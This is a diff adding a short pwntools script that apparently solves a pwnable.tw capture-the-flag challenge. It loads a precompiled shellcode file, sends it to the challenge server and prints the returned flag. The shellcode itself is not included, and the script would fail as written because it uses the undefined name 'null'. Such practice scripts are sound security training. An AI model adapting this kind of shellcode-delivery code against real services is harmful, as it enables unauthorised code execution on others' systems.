@@ -1,0 +1,26 @@
+#!/bin/python
+from pwn import *
+from binascii import hexlify
+
+
+def main():
+    print_file_payload = null
+
+    with log.progress("Loading payload...") as p:
+        print_file_payload = open("print_file.bin", "rb").read()
+        p.success()
+
+    # conn = remote('127.0.0.1', 2323)
+    conn = remote("chall.pwnable.tw", 10001)
+
+    context.terminal = ["gnome-terminal", "-e"]
+    # gdb.attach("start")
+
+    with log.progress("Receiving initial input") as p:
+        p.success("`%s`" % conn.recv(len("Give my your shellcode:")).decode())
+
+    with log.progress("Sending payload") as p:
+        conn.send(print_file_payload)
+        p.success("Obtained flag: %s" % repr(conn.recvall())[2:-3])
+
+main()
